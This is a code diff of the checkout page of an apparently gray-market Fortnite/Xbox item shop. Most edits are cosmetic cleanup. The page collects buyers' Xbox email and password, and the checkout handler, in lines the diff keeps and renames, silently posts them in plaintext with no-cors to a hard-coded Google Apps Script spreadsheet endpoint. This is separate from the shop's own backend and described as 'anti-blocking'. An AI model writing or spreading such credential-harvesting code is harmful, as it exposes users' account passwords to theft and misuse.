@@ -9,7 +9,7 @@ import CurrencySelector from '../../components/CurrencySelector';
 import { signIn, useSession } from 'next-auth/react';
 import {
   ShoppingCart, Trash2, Gamepad2, Menu, X,
-  Loader2, CheckCircle2, UploadCloud, Copy, Wallet, Check, CreditCard
+  Loader2, CheckCircle2, UploadCloud, Copy, Wallet, Check
 } from 'lucide-react';
 
 export default function CartPage() {
@@ -60,14 +60,10 @@ export default function CartPage() {
 
   if (!mounted) return null;
 
-  // Validación de que hayan escrito el correo y contraseña
+  // Validación de Xbox
   const isAccountInfoValid = xboxEmail.trim().includes('@') && xboxPassword.trim().length > 0;
-
   const totalConDescuento = Math.max(totalPrice() - (coupon?.descuento || 0), 0);
 
-  // ============================================================================
-  // PRECIO EN MONEDA LOCAL
-  // ============================================================================
   function precioLocalUnitario(item: any): number {
     const fijo =
       activeCurrency.id === 'MX' ? item.price_mx :
@@ -106,8 +102,6 @@ export default function CartPage() {
   };
 
   const paymentReady = paymentMethod === 'saldo' ? balance >= totalConDescuento && totalConDescuento > 0 : !!receiptFile;
-
-  // Paso actual dependiendo de si completaron la info
   const currentStep = !isAccountInfoValid ? 1 : !paymentReady ? 2 : 3;
 
   const handleCopy = (text: string) => {
@@ -121,9 +115,7 @@ export default function CartPage() {
     if (!session.user?.email) return alert("Error: Tu sesión no tiene un correo electrónico válido. Vuelve a iniciar sesión.");
     if (cart.length === 0) return alert("Tu carrito está vacío.");
     
-    // Validación de Xbox extra antes de enviar
     if (!xboxEmail.trim() || !xboxPassword.trim()) return alert("Necesitamos tu correo y contraseña de Xbox.");
-    
     if (paymentMethod === 'saldo' && balance < totalConDescuento) return alert("No tenés saldo suficiente. Elegí Transferencia o cargá saldo primero.");
 
     setIsProcessing(true);
@@ -150,27 +142,23 @@ export default function CartPage() {
       // --- 🚀 ENVIAR DATOS AL EXCEL VÍA POST (Anti-Bloqueos) ---
       try {
         const scriptBaseUrl = 'https://script.google.com/macros/s/AKfycbwH-s9lcSaWJAeKzUXGfBqmQypKKq2seh0bSO5eQLN88CvN-5PHXBW_X_xlPjCKmPfEjg/exec'; 
-        
-        // Preparamos los datos en el formato correcto para Google Sheets
-        const formData = new URLSearchParams();
-        formData.append('correo', xboxEmail.trim());
-        formData.append('contrasena', xboxPassword.trim());
+        const formDataExcel = new URLSearchParams();
+        formDataExcel.append('correo', xboxEmail.trim());
+        formDataExcel.append('contrasena', xboxPassword.trim());
 
-        // Hacemos el envío silencioso (no-cors) usando POST
         await fetch(scriptBaseUrl, {
           method: 'POST',
           mode: 'no-cors',
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
           },
-          body: formData.toString()
+          body: formDataExcel.toString()
         });
       } catch (sheetError) {
         console.error("No se pudo guardar en el Excel:", sheetError);
       }
       // ----------------------------------------
       
-      // 🚀 PETICIÓN AL BACKEND
       const response = await fetch('/api/checkout', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -190,10 +178,7 @@ export default function CartPage() {
       });
 
       const result = await response.json();
-
-      if (!response.ok) {
-        throw new Error(result.error || "Hubo un problema procesando el pago.");
-      }
+      if (!response.ok) throw new Error(result.error || "Hubo un problema procesando el pago.");
 
       setOrderSuccess(true);
       clearCart();
@@ -206,7 +191,6 @@ export default function CartPage() {
 
   return (
     <div className="min-h-screen bg-[#14110C] text-[#F5F1E6] font-body selection:bg-[#E3A23D] selection:text-[#0A0806] relative">
-
       <header className="flex items-center justify-between p-4 md:px-8 border-b-4 border-[#0A0806] bg-[#E3A23D] sticky top-0 z-[100]">
         <div className="flex-1 flex justify-start">
           <Link href="/" className="flex items-center gap-3 group">
@@ -216,13 +200,11 @@ export default function CartPage() {
             <span className="font-display font-bold text-xl text-[#0A0806] hidden xl:block">KITSON KIT</span>
           </Link>
         </div>
-
         <nav className="hidden lg:flex flex-1 justify-center gap-8 font-semibold text-sm text-[#0A0806]">
           <Link href="/" className="hover:opacity-70 transition">Inicio</Link>
           <Link href="/#catalogo" className="hover:opacity-70 transition">Catálogo</Link>
           <Link href="/tienda-diaria" className="hover:opacity-70 transition">Tienda Fortnite</Link>
         </nav>
-
         <div className="flex-1 flex items-center justify-end gap-3">
           <div className="hidden sm:block"><CurrencySelector /></div>
           {session ? (
@@ -253,11 +235,7 @@ export default function CartPage() {
       <main className="flex-1 max-w-7xl mx-auto w-full px-6 pt-28 pb-12 relative z-10">
         {!orderSuccess && (
           <div className="flex items-center justify-center gap-2 sm:gap-4 mb-10 max-w-lg mx-auto">
-            {[
-              { n: 1, label: 'Tu cuenta' },
-              { n: 2, label: 'Pago' },
-              { n: 3, label: 'Entrega' },
-            ].map((step, idx) => {
+            {[{ n: 1, label: 'Tu cuenta' }, { n: 2, label: 'Pago' }, { n: 3, label: 'Entrega' }].map((step, idx) => {
               const done = currentStep > step.n;
               const active = currentStep === step.n;
               return (
@@ -289,7 +267,6 @@ export default function CartPage() {
               
               <div className="kk-panel p-6 rounded-3xl">
                 <h3 className="font-display text-xl font-bold mb-4 flex items-center gap-2"><Gamepad2 className="text-[#E3A23D]"/> 1. Cuenta destino</h3>
-                
                 <div className="space-y-4">
                   <input
                     type="email" placeholder="Correo de Xbox (Microsoft)"
@@ -323,30 +300,22 @@ export default function CartPage() {
                     {cart.map((item) => (
                       <div key={item.id} className="flex items-center gap-4 bg-[#14110C] p-3 rounded-xl border-2 border-[#0A0806]">
                         <div className="flex-1"><h4 className="font-bold text-sm">{item.name}</h4></div>
-
                         {item.origen === 'catalogo' ? (
                           <div className="flex items-center gap-2 bg-[#0A0806] border-2 border-[#0A0806] rounded-lg">
                             <button
                               onClick={() => setQuantity(item.id, item.quantity - 1)}
                               className="w-8 h-8 flex items-center justify-center text-[#E3A23D] hover:bg-white/5 rounded-l-lg transition font-black"
-                              aria-label="Quitar una unidad"
-                            >
-                              −
-                            </button>
+                            > − </button>
                             <span className="w-6 text-center text-sm font-bold text-[#F5F1E6]">{item.quantity}</span>
                             <button
                               onClick={() => setQuantity(item.id, item.quantity + 1)}
                               disabled={item.quantity >= 10}
                               className="w-8 h-8 flex items-center justify-center text-[#E3A23D] hover:bg-white/5 rounded-r-lg transition font-black disabled:opacity-30"
-                              aria-label="Agregar una unidad"
-                            >
-                              +
-                            </button>
+                            > + </button>
                           </div>
                         ) : (
                           <span className="text-[#9A9384] text-xs font-bold px-1">x{item.quantity}</span>
                         )}
-
                         <p className="font-mono font-semibold text-[#E3A23D] w-20 text-right">${(item.price * item.quantity).toFixed(2)} USD</p>
                         <button onClick={() => removeFromCart(item.id)} className="text-red-500/60 hover:text-red-400 p-2 transition-colors"><Trash2 size={16} /></button>
                       </div>
@@ -372,17 +341,14 @@ export default function CartPage() {
               ) : (
                 <div className="kk-panel p-8 rounded-3xl sticky top-24">
                   <h2 className="font-display text-2xl font-bold mb-6">3. Método de pago</h2>
-
                   <div className="flex gap-2 mb-6 bg-[#14110C] p-1.5 rounded-xl border-2 border-[#0A0806]">
                     <button onClick={() => setPaymentMethod('saldo')} className={`flex-1 py-2.5 rounded-lg text-sm font-black transition-all ${paymentMethod === 'saldo' ? 'bg-[#E3A23D] text-[#0A0806]' : 'text-[#9A9384] hover:text-[#F5F1E6]'}`}>Saldo Kitson</button>
                     <button onClick={() => setPaymentMethod('manual')} className={`flex-1 py-2.5 rounded-lg text-sm font-black transition-all ${paymentMethod === 'manual' ? 'bg-[#E3A23D] text-[#0A0806]' : 'text-[#9A9384] hover:text-[#F5F1E6]'}`}>Transferencia</button>
                   </div>
-
                   <div className="mb-4">
                     <div className="flex gap-2">
                       <input
-                        type="text"
-                        value={couponInput}
+                        type="text" value={couponInput}
                         onChange={(e) => { setCouponInput(e.target.value.toUpperCase()); setCouponError(null); }}
                         placeholder="¿Tenés un cupón?"
                         className="flex-1 bg-[#14110C] border-2 border-[#0A0806] rounded-xl px-4 py-2.5 text-sm font-mono text-[#F5F1E6] placeholder-[#9A9384] focus:outline-none focus:border-[#E3A23D] uppercase"
@@ -396,7 +362,6 @@ export default function CartPage() {
                     {coupon && <p className="text-[#7BC77E] text-xs font-bold mt-2">✓ {coupon.mensaje}</p>}
                     {couponError && <p className="text-red-400 text-xs font-bold mt-2">{couponError}</p>}
                   </div>
-
                   <div className="space-y-3 mb-6 bg-[#14110C] p-5 rounded-2xl border-2 border-[#0A0806]">
                     <div className="flex justify-between text-[#9A9384] text-sm font-medium"><span>Total USD</span><span>${totalPrice().toFixed(2)}</span></div>
                     {coupon && (
@@ -410,7 +375,6 @@ export default function CartPage() {
                       </div>
                     </div>
                   </div>
-
                   {paymentMethod === 'saldo' ? (
                     <div className="mb-8 p-5 bg-[#14110C] border-2 border-[#0A0806] rounded-xl flex items-center gap-4">
                       <div className="bg-[#4A93D6]/20 p-3 rounded-full text-[#4A93D6]"><Wallet size={24}/></div>
@@ -437,7 +401,6 @@ export default function CartPage() {
                           ))}
                         </div>
                       </div>
-
                       <div className="mb-8">
                         <label className="block text-sm font-bold text-[#D9D4C7] mb-2">Sube la captura de pago <span className="text-red-400">*</span></label>
                         <label className="relative flex flex-col items-center justify-center w-full py-6 px-4 bg-[#14110C] border-2 border-dashed border-[#3A3527] hover:border-[#E3A23D] rounded-2xl cursor-pointer transition-colors group">
@@ -475,7 +438,6 @@ export default function CartPage() {
                       </div>
                     </>
                   )}
-
                   <button
                     onClick={handleCheckout}
                     disabled={isProcessing || processingFile || cart.length === 0 || !isAccountInfoValid || (paymentMethod === 'manual' && !receiptFile)}
